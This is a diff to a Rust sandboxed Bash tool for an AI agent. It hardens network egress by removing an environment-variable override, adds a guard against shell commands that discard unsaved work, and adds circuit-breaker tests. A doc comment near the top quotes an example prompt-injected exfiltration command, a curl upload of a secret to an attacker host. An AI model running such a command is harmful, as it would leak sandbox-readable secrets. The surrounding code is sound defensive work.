@@ -7,8 +7,8 @@ use serde_json::{Value, json};
 use wcore_config::shell::bash_shell_argv_prefix;
 use wcore_protocol::events::ToolCategory;
 use wcore_sandbox::{
-    NetworkPolicy, SandboxChunk, SandboxCommand, SandboxManifest, SandboxOutput, SyscallPolicy,
-    backends::SandboxBackend, default_for_platform,
+    NetworkPolicy, SandboxChunk, SandboxCommand, SandboxError, SandboxManifest, SandboxOutput,
+    SyscallPolicy, backends::SandboxBackend, default_for_platform,
 };
 use wcore_types::tool::{JsonSchema, ToolEffectContract, ToolResult};
 
@@ -16,8 +16,8 @@ use crate::context::ToolContext;
 
 mod policy;
 use crate::{Tool, ToolOutputSink};
-use policy::annotate_network_block;
 pub use policy::check_denylist;
+use policy::{SandboxScope, annotate_network_block, annotate_sandbox_denial};
 
 const DEFAULT_TIMEOUT_MS: u64 = 120_000;
 const MAX_TIMEOUT_MS: u64 = 600_000;
@@ -55,10 +55,13 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// networked shell. Every channel path therefore stays on the fail-safe
 /// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
 /// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
-/// sandbox-readable data or reach internal/metadata endpoints. On any
-/// non-local session `WAYLAND_BASH_ALLOW_NETWORK=1` is the explicit operator
-/// opt-in (via [`default_bash_network_policy`]); when no WorkspacePolicy is
-/// attached at all, the conservative default is Deny.
+/// sandbox-readable data or reach internal/metadata endpoints. On a
+/// non-local, non-channel session (an untrusted repository, or a Managed
+/// execution floor) the operator's `[security] egress_allow` is the explicit
+/// opt-in, via
+/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network);
+/// when no WorkspacePolicy is attached at all, the conservative default is
+/// Deny.
 ///
 /// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
 /// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
@@ -131,6 +134,11 @@ fn build_sandbox_pieces_for_session(
         // tools' dynamic `is_project_secret` guard already avoids. Local-keyboard
         // (Trusted, no project-secret denial) is returned unchanged, no walk.
         manifest.fs_read_deny = p.secret_deny_paths_dynamic();
+        // Stat-only, never content — see
+        // `SandboxManifest::fs_metadata_read_allow`. Assigned after
+        // `fs_read_deny` for readability only: SBPL last-match-wins is what
+        // makes the deny authoritative, and the backend emits in that order.
+        manifest.fs_metadata_read_allow = p.metadata_readable_roots();
         // The policy's confined values REPLACE any same-named entry the
         // ambient passthrough already contributed, rather than being appended
         // beside it.
@@ -195,18 +203,47 @@ fn downgrade_powershell_for_sandbox(argv: &mut Vec<String>, blocks_powershell: b
 /// Retained for direct compatibility tests. Hosted sessions must query their
 /// registry-owned [`SandboxRegistry`] so capability checks and execution use
 /// the same immutable backend.
+/// P2b — refuse a shell command that would throw away unsaved user work.
+///
+/// The shell runs in the workspace root when a policy supplies one and in the
+/// process directory otherwise. Git resolves the command's relative paths
+/// against that same directory, so the guard is asked about it and not about
+/// some other tree.
+fn unsaved_shell_refusal(
+    command: &str,
+    workspace: Option<&crate::workspace_policy::WorkspacePolicy>,
+) -> Option<String> {
+    let cwd = match workspace {
+        Some(policy) => policy.root().to_path_buf(),
+        None => std::env::current_dir().ok()?,
+    };
+    crate::unsaved_work::shell_refusal(command, &cwd)
+}
+
 pub fn platform_enforces_read_deny() -> bool {
     default_for_platform().enforces_read_deny()
 }
 
-/// Network policy for agent-initiated Bash. Defaults to
-/// [`NetworkPolicy::Deny`]; `WAYLAND_BASH_ALLOW_NETWORK=1` opts back into
-/// full host network (`Inherit`) for network-dependent workflows.
+/// Fail-safe network policy every `WorkspacePolicy` constructor is seeded
+/// with: agent-initiated Bash gets no egress until something with TRUSTED
+/// provenance grants it.
+///
+/// SEC-11 (W2/W3 conformance gate, Linux, reproduced 3/3): this used to read
+/// `WAYLAND_BASH_ALLOW_NETWORK` and return [`NetworkPolicy::Inherit`] when it
+/// was `1`/`true`, so a bare environment variable re-opened the sandboxed
+/// shell's egress — a driver-owned listener recorded `accept_count=1`. The
+/// environment is UNTRUSTED provenance: it is inherited from whatever launched
+/// the process (a CI job, a parent agent, a `direnv` file that travels with a
+/// cloned repository). Raising a boundary from there is the same supply-chain
+/// hazard `SecurityConfig::enabled` is already documented against — *"Disabling
+/// is config-file only (never a bare env var — supply-chain hazard, C8)"* — so
+/// the lever is gone rather than tightened.
+///
+/// The replacement, with the polarity the right way round, is the operator's
+/// config-file allowlist: see
+/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network).
 pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
-    match std::env::var("WAYLAND_BASH_ALLOW_NETWORK") {
-        Ok(v) if v == "1" || v.eq_ignore_ascii_case("true") => NetworkPolicy::Inherit,
-        _ => NetworkPolicy::Deny,
-    }
+    NetworkPolicy::Deny
 }
 
 /// Render a `SandboxOutput` into the `ToolResult` shape BashTool has always
@@ -221,6 +258,32 @@ pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
 /// `wcore_sandbox::backends::sandbox_exec::build_profile`). The filter deleted
 /// the only evidence of the defect it was masking, so no stderr line may be
 /// suppressed here again — a profile gap must be fixed in the profile.
+/// Prefix on every BashTool result that describes a child which ran to
+/// completion, whatever its exit status.
+///
+/// Owned here and matched by [`BashTool::error_is_tool_fault`] through this
+/// same constant, so the producer and the classifier cannot drift apart.
+pub(crate) const COMPLETED_CHILD_PREFIX: &str = "Exit code: ";
+
+/// Prefix on every BashTool result describing a command the sandbox refused
+/// before starting any child. Says plainly that nothing ran, which
+/// "Failed to execute command" did not.
+pub(crate) const REFUSED_PREFIX: &str = "Command refused, nothing ran: ";
+
+/// Render a backend error, keeping a deterministic refusal (no child started,
+/// caller-fixable by reshaping the command) distinguishable from a genuine
+/// execution failure (the spawn or the wait broke).
+fn exec_error_to_result(e: &SandboxError) -> ToolResult {
+    let content = match e {
+        SandboxError::RequestRefused(detail) => format!("{REFUSED_PREFIX}{detail}"),
+        other => format!("Failed to execute command: {other}"),
+    };
+    ToolResult {
+        content,
+        is_error: true,
+    }
+}
+
 fn output_to_result(output: SandboxOutput) -> ToolResult {
     let stdout = String::from_utf8_lossy(&output.stdout);
     let stderr = String::from_utf8_lossy(&output.stderr);
@@ -241,6 +304,18 @@ pub struct BashTool;
 impl Tool for BashTool {
     fn name(&self) -> &str {
         "Bash"
+    }
+
+    /// A shell is not sick because the command it was handed failed.
+    ///
+    /// Two shapes are the caller's request failing, not this tool's
+    /// machinery, and neither may count toward the Bash circuit breaker:
+    /// a child that ran to completion with a non-zero status, and a request
+    /// the transport refused before starting any child. A timeout, a
+    /// cancellation or a broken spawn still counts — those are the wedging
+    /// the breaker exists for.
+    fn error_is_tool_fault(&self, content: &str) -> bool {
+        !(content.starts_with(COMPLETED_CHILD_PREFIX) || content.starts_with(REFUSED_PREFIX))
     }
 
     fn description(&self) -> &str {
@@ -312,6 +387,16 @@ impl Tool for BashTool {
             };
         }
 
+        // P2b — a command that discards the work tree may not take the user's
+        // unsaved lines with it. Same question Write's guard asks, asked of the
+        // shell, before any shell is spawned.
+        if let Some(refusal) = unsaved_shell_refusal(command, None) {
+            return ToolResult {
+                content: refusal,
+                is_error: true,
+            };
+        }
+
         let timeout_ms = input["timeout"]
             .as_u64()
             .unwrap_or(DEFAULT_TIMEOUT_MS)
@@ -331,10 +416,7 @@ impl Tool for BashTool {
                 default_bash_network_policy(),
                 output_to_result(output),
             ),
-            Ok(Err(e)) => ToolResult {
-                content: format!("Failed to execute command: {}", e),
-                is_error: true,
-            },
+            Ok(Err(e)) => exec_error_to_result(&e),
             Err(_) => ToolResult {
                 content: format!("Command timed out after {}ms", timeout_ms),
                 is_error: true,
@@ -372,6 +454,16 @@ impl Tool for BashTool {
             };
         }
 
+        // P2b — a command that discards the work tree may not take the user's
+        // unsaved lines with it. Same question Write's guard asks, asked of the
+        // shell, before any shell is spawned.
+        if let Some(refusal) = unsaved_shell_refusal(command, None) {
+            return ToolResult {
+                content: refusal,
+                is_error: true,
+            };
+        }
+
         let timeout_ms = input["timeout"]
             .as_u64()
             .unwrap_or(DEFAULT_TIMEOUT_MS)
@@ -387,10 +479,7 @@ impl Tool for BashTool {
         let mut rx = match backend.execute_streaming(&manifest, cmd) {
             Ok(rx) => rx,
             Err(e) => {
-                return ToolResult {
-                    content: format!("Failed to execute command: {}", e),
-                    is_error: true,
-                };
+                return exec_error_to_result(&e);
             }
         };
 
@@ -481,6 +570,16 @@ impl Tool for BashTool {
                 is_error: true,
             };
         }
+
+        // P2b — a command that discards the work tree may not take the user's
+        // unsaved lines with it. Same question Write's guard asks, asked of the
+        // shell, before any shell is spawned.
+        if let Some(refusal) = unsaved_shell_refusal(command, ctx.workspace.as_deref()) {
+            return ToolResult {
+                content: refusal,
+                is_error: true,
+            };
+        }
         let timeout_ms = input["timeout"]
             .as_u64()
             .unwrap_or(DEFAULT_TIMEOUT_MS)
@@ -498,8 +597,14 @@ impl Tool for BashTool {
         }
         // Task 8 — exec-time capability gate. The same immutable session
         // runtime that executes the command decides whether it may run.
+        //
+        // The predicate is `shell_requires_os_read_deny()`, NOT
+        // `secret_read_deny_required()`: a session whose only shell principal is
+        // the local operator keeps its shell on a backend that cannot enforce
+        // OS read-deny (see `WorkspacePolicy::shell_requires_os_read_deny`).
+        // Every channel/remote, Managed and delegated principal is unchanged.
         if let Some(p) = ctx.workspace.as_deref()
-            && p.secret_read_deny_required()
+            && p.shell_requires_os_read_deny()
             && !backend.enforces_read_deny()
             && !backend.bypasses_containment()
         {
@@ -518,14 +623,20 @@ impl Tool for BashTool {
         );
         downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
         let net = manifest.network.clone();
+        // B1: captured before `cmd` is consumed, so a failure can be attributed
+        // to a real policy decision instead of surfacing as a bare exit code.
+        let scope = SandboxScope::new(&manifest, cmd.cwd.as_deref());
         tokio::select! {
             _ = ctx.cancel.cancelled() => ToolResult {
                 content: "Bash command cancelled by cancellation token".to_string(),
                 is_error: true,
             },
             result = tokio::time::timeout(timeout, backend.execute(&manifest, cmd)) => match result {
-                Ok(Ok(output)) => annotate_network_block(command, net, output_to_result(output)),
-                Ok(Err(e)) => ToolResult { content: format!("Failed to execute command: {e}"), is_error: true },
+                Ok(Ok(output)) => annotate_sandbox_denial(
+                    &scope,
+                    annotate_network_block(command, net, output_to_result(output)),
+                ),
+                Ok(Err(e)) => exec_error_to_result(&e),
                 Err(_) => ToolResult { content: format!("Command timed out after {timeout_ms}ms"), is_error: true },
             },
         }
@@ -560,6 +671,16 @@ impl Tool for BashTool {
             };
         }
 
+        // P2b — a command that discards the work tree may not take the user's
+        // unsaved lines with it. Same question Write's guard asks, asked of the
+        // shell, before any shell is spawned.
+        if let Some(refusal) = unsaved_shell_refusal(command, ctx.workspace.as_deref()) {
+            return ToolResult {
+                content: refusal,
+                is_error: true,
+            };
+        }
+
         let timeout_ms = input["timeout"]
             .as_u64()
             .unwrap_or(DEFAULT_TIMEOUT_MS)
@@ -578,8 +699,9 @@ impl Tool for BashTool {
                 is_error: true,
             };
         }
+        // Same predicate as `execute_with_ctx` — see the note there.
         if let Some(p) = ctx.workspace.as_deref()
-            && p.secret_read_deny_required()
+            && p.shell_requires_os_read_deny()
             && !backend.enforces_read_deny()
             && !backend.bypasses_containment()
         {
@@ -598,14 +720,13 @@ impl Tool for BashTool {
         );
         downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
         let net = manifest.network.clone();
+        // B1: see `execute_with_ctx` — same attribution on the streaming path.
+        let scope = SandboxScope::new(&manifest, cmd.cwd.as_deref());
 
         let mut rx = match backend.execute_streaming(&manifest, cmd) {
             Ok(rx) => rx,
             Err(e) => {
-                return ToolResult {
-                    content: format!("Failed to execute command: {}", e),
-                    is_error: true,
-                };
+                return exec_error_to_result(&e);
             }
         };
 
@@ -669,13 +790,16 @@ impl Tool for BashTool {
                     "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                     exit_code, stdout_buf, stderr_buf
                 );
-                annotate_network_block(
-                    command,
-                    net,
-                    ToolResult {
-                        content,
-                        is_error: exit_code != 0,
-                    },
+                annotate_sandbox_denial(
+                    &scope,
+                    annotate_network_block(
+                        command,
+                        net,
+                        ToolResult {
+                            content,
+                            is_error: exit_code != 0,
+                        },
+                    ),
                 )
             }
         }
@@ -696,6 +820,81 @@ impl Tool for BashTool {
     fn describe(&self, input: &Value) -> String {
         let cmd = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
         format!("Execute: {}", crate::truncate_utf8(cmd, 80))
+    }
+}
+
+#[cfg(test)]
+mod health_classification_tests {
+    use super::*;
+
+    /// A command the transport refused is rendered as "nothing ran" and is
+    /// NOT a tool fault.
+    ///
+    /// This is the Windows A-4 chain end to end, minus the OS: the sandbox
+    /// refuses a `cmd /C` payload carrying a line break (proven to produce
+    /// `SandboxError::RequestRefused` by the windows_cmdline unit test),
+    /// BashTool renders it, and the classifier must say the shell is fine.
+    /// Graded as a fault, three of these in thirty seconds removed Bash from
+    /// the agent for a cooldown and the run ended with no work delivered.
+    #[test]
+    fn a_refused_request_is_not_evidence_the_shell_is_unhealthy() {
+        let refused = SandboxError::RequestRefused(
+            "a Windows `cmd /C` command line cannot carry a line break.".to_string(),
+        );
+        let result = exec_error_to_result(&refused);
+        assert!(result.is_error, "the caller still has to see a failure");
+        assert!(
+            result.content.starts_with(REFUSED_PREFIX),
+            "a refusal must say nothing ran: {}",
+            result.content
+        );
+        assert!(
+            !BashTool.error_is_tool_fault(&result.content),
+            "a refused request must not count toward the Bash circuit \
+             breaker: {}",
+            result.content
+        );
+    }
+
+    /// A child that ran and exited non-zero is the caller's command failing.
+    /// `grep` with no match must never cost the agent its shell.
+    #[test]
+    fn a_non_zero_exit_is_not_evidence_the_shell_is_unhealthy() {
+        let result = output_to_result(SandboxOutput {
+            stdout: Vec::new(),
+            stderr: b"no such file\n".to_vec(),
+            exit_code: 2,
+            resource_limits: wcore_sandbox::ResourceLimitEnforcement::None,
+        });
+        assert!(result.is_error, "exit 2 is still an error to the caller");
+        assert!(
+            !BashTool.error_is_tool_fault(&result.content),
+            "a completed child is a working shell: {}",
+            result.content
+        );
+    }
+
+    /// The control, and the reason this classifier is not just `false`: the
+    /// failures the breaker exists for still count. If this ever passes
+    /// alongside the two above by returning a constant, the guard is dead.
+    #[test]
+    fn a_broken_spawn_or_a_timeout_still_counts_as_a_tool_fault() {
+        let broken = exec_error_to_result(&SandboxError::ExecFailed(
+            "child stdout was not piped".to_string(),
+        ));
+        assert!(
+            BashTool.error_is_tool_fault(&broken.content),
+            "a spawn that broke is exactly what the breaker is for: {}",
+            broken.content
+        );
+        assert!(
+            BashTool.error_is_tool_fault("Command timed out after 120000ms"),
+            "a wedged child must still trip the breaker"
+        );
+        assert!(
+            BashTool.error_is_tool_fault("Bash command cancelled by cancellation token"),
+            "a cancellation is not a completed child"
+        );
     }
 }
 
